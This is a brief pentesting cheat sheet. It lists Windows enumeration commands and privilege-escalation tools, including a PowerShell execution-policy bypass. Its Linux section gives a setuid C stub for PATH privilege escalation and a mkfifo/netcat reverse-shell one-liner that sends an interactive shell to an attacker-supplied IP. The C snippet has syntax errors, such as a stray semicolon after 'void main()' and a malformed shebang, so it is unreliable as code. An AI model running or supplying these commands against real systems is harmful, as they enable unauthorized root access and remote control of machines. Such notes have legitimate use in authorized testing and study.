# Pentesting



# Windows
## Enumeration
`whoami /priv`

`net users`

details `net user username`

`net localgroup`

`net localgroup groupname`

`systeminfo` grep with `|` ex. `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

List install updates `wmic qfe get Caption,Description,HotFixID,InstalledOn`

Listening ports on a system `netstat -ano`
`-a` all active listening ports
`n` prevetns name resolution
`-o` display process ID

Scheduled tasks `schtasks /query /fo /LIST /v`

Drivers `driverquery`

### Enumeration scripts

[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

Powershel without execution policy restrictions for PowerUp `powershell-exe -nop -exec bypass`

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
run with .txt output of systeminfo

### Vulnerable software

`wmic product`

`wmic product get name,version,vendor`

`wmic service list brief`

`wmic service list brief | findstr "Running"`

More info about service by `sc qc <Name of service>`
  
  
  
# LINUX
## Path privilege escalation
```
void main();
{ setuid(0);
setgid(0);
system("brbik");
}
```
`gcc path.c -o path -w`
`chmod 777 path`

`#/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP_HERE 4242 >/tmp/f`
